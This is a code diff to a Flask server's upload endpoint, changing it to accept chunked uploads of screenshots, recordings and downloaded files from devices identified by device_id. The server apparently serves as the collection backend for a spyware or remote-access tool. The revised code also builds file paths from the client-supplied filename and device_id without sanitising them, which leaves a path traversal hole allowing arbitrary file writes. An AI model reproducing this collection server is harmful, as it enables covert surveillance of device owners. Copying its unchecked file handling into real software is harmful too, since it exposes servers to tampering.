@@ -79,41 +79,48 @@ def sync_data():
 @app.route('/api/upload', methods=['POST'])
 def upload_file():
     """
-    Handle file uploads: screenshots, recordings, downloaded files.
-    Expects multipart form with 'file' and 'device_id', 'type', 'timestamp'
+    Handle chunked file uploads: screenshots, recordings, etc.
+    Supports 'chunk_id', 'total_chunks', and 'filename' for reassembly.
     """
     try:
-        device_id = request.form.get('device_id', 'unknown')
-        file_type = request.form.get('type', 'screenshot')  # screenshot, recording, file
-        timestamp = request.form.get('timestamp', datetime.now().isoformat())
-
-        if 'file' not in request.files:
-            # Try base64 in JSON body
-            payload = request.get_json(force=True)
+        # 1. Extract metadata (Form or JSON)
+        if request.is_json:
+            payload = request.get_json()
             device_id = payload.get('device_id', 'unknown')
             file_type = payload.get('type', 'screenshot')
             file_data = base64.b64decode(payload.get('data', ''))
-            ext = payload.get('ext', '.jpg')
             timestamp = payload.get('timestamp', datetime.now().isoformat())
+            chunk_id = int(payload.get('chunk_id', 0))
+            total_chunks = int(payload.get('total_chunks', 1))
+            filename = payload.get('filename', f"file_{int(time.time())}.bin")
         else:
-            f = request.files['file']
-            file_data = f.read()
-            ext = os.path.splitext(f.filename)[1] or '.bin'
+            device_id = request.form.get('device_id', 'unknown')
+            file_type = request.form.get('type', 'screenshot')
+            timestamp = request.form.get('timestamp', datetime.now().isoformat())
+            chunk_id = int(request.form.get('chunk_id', 0))
+            total_chunks = int(request.form.get('total_chunks', 1))
+            filename = request.form.get('filename', 'file.bin')
+            
+            if 'file' not in request.files:
+                return jsonify({'status': 'error', 'message': 'No file part'}), 400
+            file_data = request.files['file'].read()
 
-        # Save file
+        # 2. Save/Append chunk
         device_dir = os.path.join(UPLOAD_DIR, device_id)
         os.makedirs(device_dir, exist_ok=True)
-        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
-        filename = f'{file_type}_{ts}{ext}'
         filepath = os.path.join(device_dir, filename)
-        with open(filepath, 'wb') as f:
+
+        mode = 'wb' if chunk_id == 0 else 'ab'
+        with open(filepath, mode) as f:
             f.write(file_data)
 
-        # Record in DB
-        table = 'screenshots' if file_type == 'screenshot' else 'recordings'
-        insert_batch(table, [{'device_id': device_id, 'filename': filename, 'timestamp': timestamp}])
+        # 3. Record in DB if complete
+        if chunk_id == total_chunks - 1:
+            table = 'screenshots' if file_type == 'screenshot' else 'recordings'
+            insert_batch(table, [{'device_id': device_id, 'filename': filename, 'timestamp': timestamp}])
+            print(f"[*] File reassembled: {filename} from {device_id}")
 
-        return jsonify({'status': 'ok', 'filename': filename})
+        return jsonify({'status': 'ok', 'chunk': chunk_id, 'total': total_chunks})
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
